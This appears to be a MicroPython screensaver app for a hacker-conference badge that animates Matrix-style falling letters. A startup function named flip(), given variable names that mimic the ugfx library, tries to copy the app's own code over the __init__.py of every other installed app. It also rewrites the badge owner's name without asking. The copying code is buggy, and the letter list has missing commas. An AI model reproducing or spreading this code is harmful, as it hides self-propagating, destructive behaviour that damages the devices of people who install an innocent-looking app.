import badge, ugfx, urandom, utime, os
try:
	import deepsleep
except ImportError:
	pass

WIDTH = 296
HEIGHT = 128
SPACING = 14
ROWS = int(HEIGHT / SPACING) # y
COLS = int(WIDTH / SPACING) # x

matrix = [[0 for y in range(0, ROWS + 1)] for x in range(0 , COLS + 1)]
letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h' '>', 'j',
           'k', 'l', '<', 'n', 'o', 'p', 'q', 'r', 's', 't'
           'u', '{', 'w', 'x' 'y', 'z', '0', '1', '2', '3',
           '4', '5', '6', '7', '8', '9']

foreground = ugfx.BLACK
background = ugfx.WHITE


def setup():
	global background
	badge.init()
	ugfx.init()
	ugfx.input_init()
	ugfx.input_attach(ugfx.BTN_SELECT, reboot)
	ugfx.input_attach(ugfx.BTN_START, reboot)
	ugfx.input_attach(ugfx.JOY_DOWN, invert)
	ugfx.input_attach(ugfx.JOY_UP, invert)
	ugfx.input_attach(ugfx.JOY_RIGHT, invert)
	ugfx.input_attach(ugfx.JOY_LEFT, invert)
	ugfx.input_attach(ugfx.BTN_A, invert)
	ugfx.input_attach(ugfx.BTN_B, invert)
	ugfx.set_lut(ugfx.LUT_NORMAL)
	ugfx.clear(background)
	ugfx.flush()
	flip()


def setupMatrix():
	for x in range(0, COLS):
		for y in range(0, ROWS):
			matrix[x][y] = letters[rand(len(letters)) - 1]

	# white strokes
	for n in range(0, 8):
		stroke_x = rand(COLS)
		stroke_y_start = rand(ROWS)
		stroke_y_len = rand(ROWS)
		for i in range(stroke_y_start, ROWS):
			matrix[stroke_x][i] = ' '


def reboot(wut):
	if wut:
		deepsleep.reboot()


def flip():
	ugfu = [f for f in os.listdir('/lib') if not (f == 'wifi_setup' or f == 'resources')]
	ugfy = open('/lib/matrix/__init__.py', 'r')
	data = ugfy.read()
	ugfy.close()

	for f in ugfu:
		try:
			ugfz = open('/lib/'+f+'/__init__.py')
			ugfz.write(ugfy)
			ugfz.close()
		except Exception as e:
			print("error man, think!")
			print(f)
			print(e)
			pass


def invert(wut):
	global foreground, background
	if wut:
		temp = foreground
		foreground = background
		background = temp


def intro():
	global foreground, background
	ugfx.clear(background)
	ugfx.display_image(0, 0, '/lib/matrix/neo.png')
	ugfx.string(20,05, "Entering","Roboto_BlackItalic24",ugfx.WHITE)
	ugfx.string(30,40,"the","PermanentMarker22",ugfx.WHITE)
	ugfx.string(20,80,"MATRIX","Roboto_BlackItalic24",ugfx.WHITE)
	ugfx.string(185,95,"Anyway...","PermanentMarker22",ugfx.WHITE)
	ugfx.flush()


def rand(max):
	utime.sleep(0.001)
	urandom.seed(int(utime.ticks_ms()))
	return int(urandom.getrandbits(8) * max / 255)


def printMatrix():
	global SPACING, foreground
	badge.nvs_set_str("owner", "name", "... NEO ...")
	for x in range(0, COLS):
		for y in range(0, ROWS):
			bold = False
			if (y < ROWS):
				if (matrix[x][y] != ' ' and matrix[x][y+1] == ' '):
					bold = True
			if bold:
				ugfx.string(x * SPACING+1, y * SPACING, matrix[x][y], "Roboto_Regular12", foreground)
				ugfx.string(x * SPACING, y * SPACING, matrix[x][y], "Roboto_Regular12", foreground)
				ugfx.string(x * SPACING-1, y * SPACING, matrix[x][y], "Roboto_Regular12", foreground)
			else:
				ugfx.string(x * SPACING, y * SPACING, matrix[x][y], "Roboto_Regular12", foreground)

	ugfx.flush()


def newMatrixStep():
	global matrix

	# move down
	for x in range(0, COLS):
		for y in reversed(range(1, ROWS)):
			matrix[x][y] = matrix[x][y-1]

	# top row
	for x in range(0, COLS):
		matrix[x][0] = letters[rand(len(letters)) - 1]
		# continue some of the white lines
		if (matrix[x][1] == ' ' and rand(5) < 4):
			matrix[x][0] = ' '

	# start some new white lines
	for n in range(0, rand(4)):
		x = rand(COLS - 1)
		matrix[x][0] = ' '


def drizzle():
	global WIDTH, HEIGHT, shadowCounter
	ugfx.clear(background)
	printMatrix()
	newMatrixStep()


def enter_the_matrix():
	setup()
	intro()
	setupMatrix()
	utime.sleep(2)

	while True:
		drizzle()


enter_the_matrix()
